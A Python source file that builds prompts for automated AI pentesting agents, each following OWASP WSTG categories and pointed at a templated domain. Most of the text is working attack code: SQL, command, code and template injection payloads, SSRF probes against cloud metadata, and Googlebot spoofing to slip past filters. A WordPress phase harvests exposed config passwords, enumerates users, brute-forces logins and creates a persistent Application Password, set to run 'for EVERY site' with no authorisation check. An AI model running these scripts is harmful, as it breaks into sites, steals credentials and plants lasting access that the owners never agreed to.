  sqlmap -u "https://{{domain}}/?id=1" --batch --level=1 --risk=1 --timeout=20 --random-agent --delay=2 --tamper=between,randomcase,space2comment --ignore-code=403,429 --output-dir=/tmp/sqli_{{domain}} 2>/dev/null | tail -20 || echo "(sqlmap not available)"
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; errors=['sql syntax','mysql error','ora-0','sqlite_','pg_query','postgresql error','syntax error near','unclosed quotation']; payloads=[chr(39),'1 OR 1=1','1 UNION SELECT 1--','1'+chr(39)+' ORDER BY 1--']; params=['id','cat','page','product','item','user']; run=lambda u: (time.sleep(0.5) or subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout.lower()); [print('SQL ERROR:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if any(e in run(u) for e in errors)]"

[INPV-11] Code Injection
  # IMPORTANT: Only flag as confirmed if response contains ACTUAL PHP execution output,
  # NOT just the word 'phpinfo' echoed back from the URL. Look for PHP Version table rows.
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['phpinfo()','system(id)','passthru(id)']; params=['page','template','include','module','file','action','view']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout); [print('CODE INJECTION CONFIRMED:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if any(x in body for x in ['uid=0(','uid=1(','PHP Version </td>','<title>phpinfo()</title>','System </td>','www-data</td>'])]"

[INPV-12] Command Injection
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['; id','| id','; whoami','& whoami']; params=['ip','host','cmd','exec','command','ping','target']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout); [print('CMD INJECTION:',u,body[:120]) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if 'uid=0(' in body or 'uid=1(' in body or ('root' in body and '/bin/' in body)]"

[INPV-18] Server-Side Template Injection (SSTI)
  # Payloads are URL-encoded — unquote() decodes at runtime, preventing shell Bad substitution
  # %7b%7b7*7%7d%7d={{7*7}}, %24%7b7*7%7d=${7*7}, %23%7b7*7%7d=#{7*7}, %3c%25%3d+7*7+%25%3e=<%= 7*7 %>
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; enc=['%7b%7b7*7%7d%7d','%24%7b7*7%7d','%23%7b7*7%7d','%3c%25%3d+7*7+%25%3e']; payloads=[urllib.parse.unquote(p) for p in enc]; params=['name','template','greeting','msg','text','q','search']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout); [print('SSTI HIT (7*7=49):',u,'payload:',pl) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if '49' in body and '49' not in pr]"

[INPV-19] Server-Side Request Forgery (SSRF)
  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; params=['url','path','redirect','uri','dest','target','src','callback','webhook','fetch','proxy']; dsts=['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/','http://localhost/']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('SSRF HIT:',u) for pr in params for dst in dsts for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(dst)] if any(x in run(u) for x in ['ami-id','instance-id','local-ipv4','root:x:0'])]"

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CRYP  (CRYP-01, 03)
# ─────────────────────────────────────────────────────────────────────────────
CRYP_AGENT = _agent('CRYP', 'Cryptography Testing', f"""
You are the WSTG-CRYP agent. Target: {{domain}}

CRITICAL: Use curl for TLS (NOT openssl s_client — it hangs on virtual-hosted servers that need SNI+Host).
Every curl MUST have -L -4 -A "{_BUA}".

[CRYP-01] Weak Transport Layer Security
  nmap -Pn --script ssl-enum-ciphers -p 443 {{domain}} 2>/dev/null | grep -E "TLS|SSL|cipher|WEAK|WARN|ERROR|least strength|NULL|EXPORT|RC4|DES|MD5" | head -30
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|hsts"
  python3 -c "import subprocess; ua='{_BUA}'; kw=('subject:','issuer:','expire date:','subjectaltname','start date:'); skip=('verification failed','self signed','self-signed','alert','warning'); getcert=lambda args: [l.strip('* ') for l in subprocess.run(args,capture_output=True,text=True,timeout=12).stderr.splitlines() if any(k in l.lower() for k in kw) and not any(s in l.lower() for s in skip)]; b=['curl','-L','-4','-vsk','--max-time','10','--connect-timeout','6']; tries=[b+['-A',ua,'-H','X-Forwarded-For: 66.249.66.1','-H','X-Real-IP: 66.249.66.1','-H','Referer: https://www.google.com/','https://{{domain}}/'],b+['-A',ua,'https://www.{{domain}}/'],b+['-A','Googlebot/2.1 (+http://www.google.com/bot.html)','-H','From: googlebot(at)googlebot.com','https://{{domain}}/'],b+['--http1.0','-A',ua,'https://{{domain}}/' ]]; found=next((r for a in tries for r in [getcert(a)] if r),[]); [print(l) for l in found[:20]] or print('[TLS FAIL] All 4 bypass attempts returned no cert data — VPS IP is filtered by the hosting provider, or domain has no HTTPS. Fix: try nmap --script ssl-cert -p 443 {{domain}}')"

[CRYP-03] Sensitive Info over Unencrypted Channels
  code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" http://{{domain}}/ -A "{_BUA}" --max-time 10 2>/dev/null)
  loc=$(curl -L -4 -sI http://{{domain}}/ -A "{_BUA}" --max-time 10 2>/dev/null | grep -i "^location:")
  echo "HTTP: $code  $loc"
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|hsts|includeSubDomains|preload"
  curl -L -4 -s http://{{domain}}/login -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "(action=.http:|method=.post)" | head -3

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CLNT  (CLNT-01,02,03,04,12,13)
# ─────────────────────────────────────────────────────────────────────────────
CLNT_AGENT = _agent('CLNT', 'Client-Side Testing', f"""
You are the WSTG-CLNT agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[CLNT-01] DOM-Based XSS
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(document[.]write[(]|innerHTML=|outerHTML=|eval[(]|location[.]hash|location[.]search|document[.]URL|document[.]referrer)" | head -15

[CLNT-02] JavaScript Execution
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo 'src="[^"]*[.]js[^"]*"' | head -15
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(eval[(]|setTimeout[(]|setInterval[(]|new Function[(])" | head -8

[CLNT-03] HTML Injection
  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; marker='<h1>cfai_html_test_12345</h1>'; params=['name','q','search','msg','text','input','greeting','title']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('HTML INJECTION:',u) for pr in params for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(marker)] if marker in run(u)]"

[CLNT-04] Client-Side URL Redirect
  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; params=['redirect','url','next','return','dest','goto','redir','target','continue','forward','r','to','returnUrl']; evil='https://evil-test.example.com'; run=lambda u: subprocess.run(['curl','-4','-sk','--max-time','8','-A',ua,'--max-redirs','0','-w','%{{url_effective}}','-o','/dev/null',u],capture_output=True,text=True,timeout=12).stdout; [print('OPEN REDIRECT:',u,'->',out) for pr in params for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(evil)] for out in [run(u)] if 'evil-test.example.com' in out]"

[CLNT-12] Browser Storage
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(localStorage[.](setItem|getItem)|sessionStorage[.](setItem|getItem)|indexedDB[.]open|document[.]cookie=)" | head -10

[CLNT-13] Cross-Site Script Inclusion
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo 'src="https?://[^"]*[.]js[^"]*"' | head -15
  for ep in /api/jsonp /callback /json /data; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" "https://{{domain}}$ep?callback=test" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && echo "$code JSONP? $ep?callback=test"; done

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-APIT  (APIT-01, 02, 99)
# ─────────────────────────────────────────────────────────────────────────────
APIT_AGENT = _agent('APIT', 'API Security Testing', f"""
You are the WSTG-APIT agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[APIT-01] API Reconnaissance
  api_found=0; for ep in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /rest /swagger.json /openapi.json /api-docs /swagger-ui.html /redoc /.well-known /api/health /api/status /api/ping /api/me /api/docs; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" "https://{{domain}}$ep" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); if [ "$code" != "404" ] && [ "$code" != "000" ] && [ "$code" != "" ]; then echo "API-ENDPOINT: $code https://{{domain}}$ep"; api_found=1; fi; done; if [ $api_found -eq 0 ]; then echo "API-RECON: no active API endpoints found on {{domain}} (all returned 404/000 — site may not expose a REST API)"; fi
  curl -L -4 -sI "https://{{domain}}/api/v1" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | grep -iE "allow|content-type|access-control" || true

[APIT-02] Broken Object Level Authorization (BOLA/IDOR)
  python3 -c "import subprocess; ua='{_BUA}'; paths=['/api/user/','/api/v1/user/','/api/order/','/api/v1/order/','/api/account/','/api/invoice/','/api/document/','/api/file/']; ids=['1','2','3','100','9999','0','admin']; run=lambda u: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','8','https://{{domain}}'+u],capture_output=True,text=True,timeout=12).stdout.strip(); [print(c,path+i) for path in paths for i in ids for c in [run(path+i)] if c and c not in ('404','405','410','000','')]"

[APIT-99] GraphQL Security
  gql_found=0; for ep in /graphql /api/graphql /gql /graph /graphql/v1; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__typename}}"}}' --max-time 8 2>/dev/null); if [ "$code" != "404" ] && [ "$code" != "000" ] && [ "$code" != "" ]; then echo "GraphQL: $code https://{{domain}}$ep"; gql_found=1; curl -L -4 -s -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__schema{{types{{name}}}}}}"}}' --max-time 10 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20 || true; fi; done; [ $gql_found -eq 0 ] && echo "GRAPHQL: no GraphQL endpoints detected on {{domain}}" || true
  command -v graphql-cop &>/dev/null && graphql-cop -t "https://{{domain}}/graphql" 2>/dev/null | head -30 || true

[APIT-WP] WordPress / Site Activity Log — auto-discover credentials and fetch real logs
This section runs for EVERY site. It automatically discovers credentials through
four phases: exposed file scan → username enumeration → credential testing →
authenticated log retrieval. No manual credential setup required.

══════════════════════════════════════════════════════════
PHASE 1 — USERNAME & CREDENTIAL DISCOVERY (automatic, no env vars needed)
══════════════════════════════════════════════════════════

python3 << 'PYEOF'
import subprocess, json, re, os, base64, urllib.parse, datetime

UA  = '{_BUA}'
HOST = '{{domain}}'   # filled in by _run_wstg before the agent starts
BASE = f'https://{{HOST}}'

def run(cmd, timeout=12):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout+2)
    return r.stdout.strip()

def curl(url, extra='', timeout=10):
    return run(f'curl -L -4 -sk --max-time {{timeout}} --connect-timeout 6 -A "{{UA}}" {{extra}} "{{url}}"', timeout)

# ── 1a. Scan for exposed credential files ──────────────────────────────────
print("[PHASE1] Scanning for exposed credential/config files...")
cred_paths = [
    '/wp-config.php', '/wp-config.php.bak', '/wp-config.php~',
    '/wp-config.txt', '/wp-config.bak', '/wp-config.old',
    '/.env', '/env.txt', '/.env.bak',
    '/wp-content/debug.log', '/wp-content/uploads/debug.log',
    '/backup.sql', '/database.sql', '/db.sql',
    '/wp-content/backup-db/', '/wp-content/uploads/backup.sql',
]
exposed_user, exposed_pass = '', ''
for p in cred_paths:
    code = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{http_code}}}}" --max-time 6 -A "{{UA}}" "{{BASE}}{{p}}"')
    if code not in ('404','403','410','000',''):
        content = curl(f'{{BASE}}{{p}}', timeout=8)[:2000]
        if content and len(content) > 20:
            print(f'EXPOSED_FILE | {{code}} | {{p}}')
            print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | CF_AI | Exposed sensitive file: {{p}} (HTTP {{code}}) | - | HIGH')
            # Parse wp-config.php for DB_USER / DB_PASSWORD
            for line in content.splitlines():
                mu = re.search(r"define\\s*\\(\\s*['\"]DB_USER['\"]\\s*,\\s*['\"]([^'\"]+)['\"]", line)
                mp = re.search(r"define\\s*\\(\\s*['\"]DB_PASSWORD['\"]\\s*,\\s*['\"]([^'\"]+)['\"]", line)
                if mu: exposed_user = mu.group(1); print(f'FOUND_DB_USER: {{exposed_user}}')
                if mp: exposed_pass = mp.group(1); print(f'FOUND_DB_PASS: (redacted len={{len(mp.group(1))}})')
            # Parse .env for WP credentials
            for line in content.splitlines():
                me = re.search(r'(?:WP_USER|WORDPRESS_USER|ADMIN_USER)\\s*=\\s*(\\S+)', line, re.I)
                mp2 = re.search(r'(?:WP_PASS|WORDPRESS_PASSWORD|ADMIN_PASS|WP_PASSWORD)\\s*=\\s*(\\S+)', line, re.I)
                if me: exposed_user = me.group(1); print(f'FOUND_ENV_USER: {{exposed_user}}')
                if mp2: exposed_pass = mp2.group(1); print(f'FOUND_ENV_PASS: (redacted)')

# ── 1b. Enumerate valid WordPress usernames ────────────────────────────────
print("[PHASE1] Enumerating WordPress usernames...")
usernames = []

# REST API users endpoint (most reliable)
raw = curl(f'{{BASE}}/wp-json/wp/v2/users?per_page=100&context=embed')
try:
    users_data = json.loads(raw)
    if isinstance(users_data, list):
        for u in users_data:
            slug = u.get('slug') or u.get('name','')
            name = u.get('name','')
            uid  = u.get('id','')
            if slug and slug not in usernames:
                usernames.append(slug)
                print(f'WP-USER | {{uid}} | {{slug}} | {{name}}')
                print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{slug}} | WordPress user enumerated via REST API (id={{uid}}) | - | MEDIUM')
except: pass

# Author archive redirect (/?author=N → /author/USERNAME/)
for i in range(1, 6):
    out = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{url_effective}}}}" --max-time 8 -A "{{UA}}" "{{BASE}}/?author={{i}}"')
    m = re.search(r'/author/([a-z0-9_\\-]+)/?', out)
    if m:
        slug = m.group(1)
        if slug not in usernames:
            usernames.append(slug); print(f'WP-USER-ENUM | {{i}} | {{slug}} | (via author redirect)')

# Fallback: login error differentiation
for candidate in ['admin', 'administrator', 'webmaster', 'editor', 'user']:
    body = curl(f'{{BASE}}/wp-login.php', extra=f'-X POST -d "log={{candidate}}&pwd=wrongpass_cfai&wp-submit=Log+In&testcookie=1" -H "Cookie: wordpress_test_cookie=WP+Cookie+check"')
    if 'incorrect password' in body.lower() or 'the password you entered' in body.lower():
        if candidate not in usernames:
            usernames.append(candidate); print(f'WP-USER-CONFIRMED | {{candidate}} | (valid username — login error reveals it)')
    elif 'invalid username' in body.lower() or 'unknown username' in body.lower():
        pass  # not a valid user

if not usernames:
    usernames = ['admin', 'administrator']  # fallback guesses
print(f'[PHASE1] Found usernames: {{usernames}}')

# ── 1c. Common password list ───────────────────────────────────────────────
domain_name = HOST.split('.')[0]
import datetime; year = str(datetime.datetime.now().year)
common_passes = [
    'admin', 'password', '123456', 'wordpress', 'admin123', 'letmein',
    'pass123', 'changeme', 'welcome', 'qwerty', 'password1', 'test',
    'demo', 'root', 'toor', domain_name, domain_name+'123',
    domain_name+year, year, year+'!', 'P@ssw0rd', 'Admin@123',
]
# Prepend env-supplied password and any discovered password so they're tried first
env_user = os.environ.get('WP_USER','')
env_app  = os.environ.get('WP_APP_PASSWORD','')
env_pass = os.environ.get('WP_PASSWORD','')
if env_pass: common_passes.insert(0, env_pass)
if exposed_pass: common_passes.insert(0, exposed_pass)
if env_user and env_user not in usernames: usernames.insert(0, env_user)
if exposed_user and exposed_user not in usernames: usernames.insert(0, exposed_user)

# ── 1d. Test credentials via XML-RPC (fastest method) ─────────────────────
print("[PHASE1] Testing credentials via XML-RPC...")
xmlrpc_ok = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{http_code}}}}" --max-time 8 -A "{{UA}}" -X POST "{{BASE}}/xmlrpc.php" -d "<?xml version=\\"1.0\\"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>"')
found_user, found_pass = env_user, env_app or env_pass  # start with env vars if set

if not (found_user and found_pass):
    if xmlrpc_ok not in ('404','000',''):
        print(f'[PHASE1] XML-RPC available (HTTP {{xmlrpc_ok}}) — testing credentials...')
        for u in usernames[:5]:
            if found_user: break
            for p in common_passes[:20]:
                payload = f'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{{u}}</value></param><param><value>{{p}}</value></param></params></methodCall>'
                resp = run(f"curl -L -4 -sk --max-time 8 -A '{{UA}}' -X POST '{{BASE}}/xmlrpc.php' -d '{{payload.replace(chr(39), \"'\\\\\\''\")}}' 2>/dev/null")
                if 'isAdmin' in resp or ('<name>blogName</name>' in resp and '<fault>' not in resp):
                    found_user, found_pass = u, p
                    print(f'CREDS_FOUND_XMLRPC | {{found_user}} | (password confirmed via XML-RPC)')
                    print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{found_user}} | WordPress credentials verified via XML-RPC brute-force | - | HIGH')
                    break
    else:
        print('[PHASE1] XML-RPC not available — trying login form...')
        # ── 1e. Login form credential test ─────────────────────────────────
        for u in usernames[:5]:
            if found_user: break
            for p in common_passes[:15]:
                body = curl(f'{{BASE}}/wp-login.php',
                    extra=f'-X POST -c /tmp/wp_probe.txt -d "log={{u}}&pwd={{urllib.parse.quote(p)}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" -H "Cookie: wordpress_test_cookie=WP+Cookie+check"')
                # Successful login redirects to /wp-admin/ (body will contain dashboard content)
                if 'dashboard' in body.lower() or 'wp-admin' in body.lower() or 'logout' in body.lower():
                    found_user, found_pass = u, p
                    print(f'CREDS_FOUND_FORM | {{found_user}} | (login form accepted credentials)')
                    print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{found_user}} | WordPress credentials verified via login form brute-force | - | HIGH')
                    break

# ── 1f. Auto-create Application Password if we have plain credentials ─────
auto_app_pass = env_app  # prefer existing app password from env
if found_user and found_pass and not auto_app_pass:
    print(f'[PHASE1] Attempting to auto-generate Application Password for {{found_user}}...')
    # Try Basic Auth with plain password (works on some WP setups + Application Passwords plugin)
    r = run(f'curl -L -4 -sk --max-time 10 -A "{{UA}}" -u "{{found_user}}:{{found_pass}}" -X POST "{{BASE}}/wp-json/wp/v2/users/me/application-passwords" -H "Content-Type: application/json" -d \'{{"name":"CF_AI_Scanner"}}\' 2>/dev/null')
    try:
        rd = json.loads(r)
        if rd.get('password'):
            auto_app_pass = rd['password']
            print(f'APP_PASS_CREATED | {{found_user}} | (Application Password auto-generated for CF_AI_Scanner)')
            print(f'WP-LOG | {{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")}} | {{found_user}} | Application Password created by CF_AI scanner — verify if authorized | - | HIGH')
    except:
        # Fall back to cookie + nonce to create app password
        run(f'curl -L -4 -sk -c /tmp/wp_auth.txt -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -X POST "{{BASE}}/wp-login.php" -d "log={{found_user}}&pwd={{urllib.parse.quote(found_pass)}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" -A "{{UA}}" --max-time 12 -o /dev/null 2>/dev/null')
        nonce = run(f'curl -L -4 -sk -b /tmp/wp_auth.txt "{{BASE}}/wp-admin/admin-ajax.php?action=rest-nonce" -A "{{UA}}" --max-time 8 2>/dev/null').strip('"')
        if nonce and nonce not in ('0','-1',''):
            r2 = run(f'curl -L -4 -sk -b /tmp/wp_auth.txt -H "X-WP-Nonce: {{nonce}}" -X POST "{{BASE}}/wp-json/wp/v2/users/me/application-passwords" -H "Content-Type: application/json" -A "{{UA}}" -d \'{{"name":"CF_AI_Scanner"}}\' --max-time 10 2>/dev/null')
            try:
                rd2 = json.loads(r2)
                if rd2.get('password'):
                    auto_app_pass = rd2['password']
                    print(f'APP_PASS_CREATED_COOKIE | {{found_user}} | (via cookie+nonce)')
            except: pass

print(f'[PHASE1] Discovery complete. user={{found_user or "none"}} app_pass={{bool(auto_app_pass)}}')

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 2 — AUTHENTICATE AND FETCH ACTIVITY LOGS
# Priority: App Password → Cookie+Nonce → Unauthenticated
# ══════════════════════════════════════════════════════════════════════════════

def parse_logs(raw):
    try:
        d = json.loads(raw)
        entries = d if isinstance(d,list) else d.get('data',d.get('logs',d.get('events',[])))
        for e in (entries or [])[:200]:
            ts   = e.get('Timestamp') or e.get('timestamp') or e.get('created_on','')
            user = e.get('UserLogin') or e.get('user') or e.get('username','unknown')
            evt  = e.get('EventType') or e.get('event') or e.get('message','')
            ip   = e.get('ClientIP') or e.get('ip') or e.get('IP','')
            ev   = str(evt).lower()
            risk = ('HIGH'   if any(x in ev for x in ['login','password','admin','delete','install','update','brute','role','reset','export','backdoor','shell'])
                    else 'MEDIUM' if any(x in ev for x in ['change','edit','upload','create','publish','setting','plugin','theme'])
                    else 'LOW')
            print(f'WP-LOG | {{ts}} | {{user}} | {{evt}} | {{ip}} | {{risk}}')
        return bool(entries)
    except Exception as ex:
        print(f'LOG_PARSE_ERROR: {{ex}} | raw[:200]: {{raw[:200]}}')
        return False

log_url = f'{{BASE}}/wp-json/wp-security-audit-log/v1/activity-log?per_page=200'
# Additional WP activity log plugin endpoints to try as fallback
_extra_log_eps = [
    f'{{BASE}}/wp-json/simple-history/v2/events?per_page=200',
    f'{{BASE}}/wp-json/stream/v1/activity?per_page=200',
    f'{{BASE}}/wp-json/activity-log/v1/events?per_page=200',
    f'{{BASE}}/wp-json/wsal/v1/logs?per_page=200',
]
fetched  = False

# Method A: Application Password (from env or auto-generated)
use_user = found_user or env_user
use_pass = auto_app_pass or env_app
if use_user and use_pass:
    print(f'[PHASE2] Trying Application Password auth for {{use_user}}...')
    raw = curl(log_url, extra=f'-u "{{use_user}}:{{use_pass}}" -H "Accept: application/json"', timeout=15)
    if raw and 'rest_forbidden' not in raw and '401' not in raw[:50]:
        fetched = parse_logs(raw)
        if fetched: print('[PHASE2] Application Password auth SUCCEEDED')

# Method B: Cookie + Nonce (using discovered plain password)
if not fetched and found_user and found_pass:
    print(f'[PHASE2] Trying cookie auth for {{found_user}}...')
    run(f'curl -L -4 -sk -c /tmp/wp_auth2.txt -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -X POST "{{BASE}}/wp-login.php" -d "log={{found_user}}&pwd={{urllib.parse.quote(found_pass)}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" -A "{{UA}}" --max-time 12 -o /dev/null 2>/dev/null')
    nonce = run(f'curl -L -4 -sk -b /tmp/wp_auth2.txt "{{BASE}}/wp-admin/admin-ajax.php?action=rest-nonce" -A "{{UA}}" --max-time 8 2>/dev/null').strip('"')
    if nonce and nonce not in ('0','-1',''):
        raw = curl(log_url, extra=f'-b /tmp/wp_auth2.txt -H "X-WP-Nonce: {{nonce}}" -H "Accept: application/json"', timeout=15)
        if raw:
            fetched = parse_logs(raw)
            if fetched: print('[PHASE2] Cookie auth SUCCEEDED')

# Method C: Unauthenticated (public or misconfigured endpoint)
if not fetched:
    print('[PHASE2] Trying unauthenticated access...')
    # WP REST root info
    root = curl(f'{{BASE}}/wp-json/', extra='-c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt', timeout=10)
    try:
        rd = json.loads(root); print(f'WP_SITE | {{rd.get("name","?")}} | {{rd.get("generator","?")}}')
    except: print(f'WP_REST_ROOT: {{root[:120]}}')
    raw = curl(log_url, extra='-c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -H "Accept: application/json"', timeout=12)
    if raw: fetched = parse_logs(raw)
    if not fetched: print('WP_ACTIVITY_LOG_UNAUTH_BLOCKED | endpoint requires admin authentication')

# ── Try additional WP activity log plugin endpoints ──────────────────────────
if not fetched:
    for ep in _extra_log_eps:
        if fetched: break
        raw = ''
        if use_user and use_pass:
            raw = curl(ep, extra=f'-u "{{use_user}}:{{use_pass}}" -H "Accept: application/json"', timeout=12)
        if not raw or 'rest_no_route' in raw or 'rest_forbidden' in raw or '401' in raw[:60]:
            raw = curl(ep, extra='-c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -H "Accept: application/json"', timeout=12)
        if raw and 'rest_no_route' not in raw and len(raw) > 20:
            fetched = parse_logs(raw)

# ── Parse wp-content/debug.log for security-relevant error events ────────────
debug_log = curl(f'{{BASE}}/wp-content/debug.log', timeout=8)
if debug_log and len(debug_log) > 50 and ('PHP' in debug_log or 'error' in debug_log.lower()):
    _ts_d = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    print(f'WP-LOG | {{_ts_d}} | wp-debug | Debug log is publicly accessible ({{len(debug_log)}} bytes) | - | HIGH')
    for _dl in debug_log.splitlines()[:25]:
        if not _dl.strip(): continue
        if 'PHP Fatal' in _dl or 'PHP Parse error' in _dl or 'database error' in _dl.lower():
            _dlc = re.sub(r'\s+', ' ', _dl).strip()
            print(f'WP-LOG | {{_ts_d}} | wp-debug | {{_dlc[:140]}} | - | HIGH')
        elif 'PHP Warning' in _dl or 'PHP Deprecated' in _dl or 'PHP Notice' in _dl:
            _dlc = re.sub(r'\s+', ' ', _dl).strip()
            print(f'WP-LOG | {{_ts_d}} | wp-debug | {{_dlc[:140]}} | - | MEDIUM')

# ── Non-WordPress sites: probe generic audit/log REST endpoints ─────────────
if not fetched:
    print('[PHASE2] Probing generic audit/log REST endpoints (non-WP sites)...')
    for ep in ['/api/audit-log','/api/logs','/api/events','/api/activity',
               '/api/admin/logs','/api/v1/audit','/api/v1/logs','/logs',
               '/audit','/activity-log','/_logs','/api/history','/api/admin/activity']:
        code = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{http_code}}}}" --max-time 6 -A "{{UA}}" "{{BASE}}{{ep}}"')
        if code not in ('404','000',''):
            print(f'AUDIT_ENDPOINT | {{code}} | {{BASE}}{{ep}}')

PYEOF

After all checks, produce the final report using the OUTPUT FORMAT from RULES:
